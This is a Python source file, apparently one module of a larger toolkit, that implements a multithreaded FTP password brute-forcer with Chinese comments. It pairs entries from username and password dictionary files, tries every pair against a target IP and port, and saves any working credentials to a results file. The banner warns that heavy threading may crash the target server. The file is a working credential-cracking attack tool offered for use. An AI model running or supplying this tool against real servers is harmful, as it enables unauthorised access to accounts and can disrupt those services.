import ftplib
import  sys
import threading
import queue
from lib.choose import UseStyle # 设置颜色
from conf import config # 配置文件
from lib.Auxiliary import current_time # 当前时间

pause=False # 破解成功用于暂程和禁止输出的


# 提取出来的结果保存起来
def Searchresults(results_IP):
    Searchresults_document = open(config.Savelocation['ftp'], 'a')  # 打开文件写的方式
    Searchresults_document.write((results_IP+'\n'))  # 写入
    Searchresults_document.close()  # 关闭文件

# 多线程
def Thread(ip,port,quantity,admin,passwd):
    Thread=queue.Queue()
    for username in open(admin):
        for password in open(passwd):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            diclist=username+'|'+password
            Thread.put(diclist)
    for i in  range(int(quantity)):# 定义线程数
        Threads=threading.Thread(target=Log_in,args=(Thread,ip,port,))
        Threads.start()


# 破解
def Log_in(Thread,ip,port):
    global pause
    while not Thread.empty():
        user_passwd=Thread.get()
        user_passwd=user_passwd.split('|')
        if pause == True:# 破解成功用于暂程和禁止输出的
            break
        else:
            try:
                try:
                    ftp=ftplib.FTP(timeout=7) #
                    ftp.connect(str(ip),int(port))# 连接的目标ip和端口

                    ftp.login(user_passwd[0],user_passwd[1]) # 输入密码

                    print(current_time()+"破解成功正确：用户是"+user_passwd[0]+"密码是："+user_passwd[1])
                    Searchresults(ip+"：破解成功正确用户是"+user_passwd[0]+"密码是："+user_passwd[1])
                    #print(ftp.retrlines('list'))
                    ftp.close()
                    pause = True  # 破解成功用于暂程和禁止输出的
                    break

                except ConnectionRefusedError:
                    print(current_time()+"连接被拒绝\n*可能对方没有开启FTP服务\n*或者你的地址和端口错误")
                    break
            except ftplib.error_perm:
                if pause == True:  # 破解成功用于暂程和禁止输出的
                    break
                else:
                    ftp.close()
                    # 原位输出
                    print(str(current_time()+UseStyle("密码错误: ",fore='yellow')+UseStyle("用户: "+user_passwd[0],fore='red')+UseStyle("密码: "+user_passwd[1],fore='red')))
            except TimeoutError:
                ftp.close()
                print("超时！")

def enter():
    print("""
         _____ _____ ____  
        |  ___|_   _|  _ \ 
        | |_    | | | |_) |
        |  _|   | | |  __/ 
        |_|     |_| |_|    
                                FTP服务器的爆破
    注意：发生请求过多可能会对目标服务器扫挂，尽量不要太多线程
    语法：python 文件名.py [ip] [端口] [线程数量]
    """)
    ip=sys.argv[1]
    port=sys.argv[2]
    quantity=sys.argv[3]

def fill_in(args):
    ip=args.ftp # ip
    port=args.ftpp # 端口
    quantity=args.ftpt # 线程
    admin=args.ftpadmin # 用户
    passwd=args.ftppasswd # 密码

    print("扫描的结果文件保存在："+config.Savelocation['ftp'])
    if admin == None or port=='':
        admin=config.Specifyablastdictionary['ftp']['admin']
        print("当前使用的默认用户字典文件在："+admin)
    else:
        print("当前使用指定用户字典文件在：" + admin)

    if passwd == None or port == '':
        passwd=config.Specifyablastdictionary['ftp']['passwd']
        print("当前使用的默认密码字典文件在：" + passwd)
    else:
        print("当前使用指定密码字典文件在：" + passwd)


    if port==None:
        port=21
        print("当前使用的默认端口21")
    else:
        print("当前指定端口"+str(port))
    if quantity==None or quantity=='':
        quantity=1
        print("当前使用的默认线程1")
    else:
        print("当前指定的线程数："+str(quantity))
    port = int(port)
    quantity = int(quantity)

    print(UseStyle("现在扫描的是"+(ip+ "端口是" + str(port)),mode='underline',fore='red'))
    Thread(ip,port,quantity,admin,passwd)
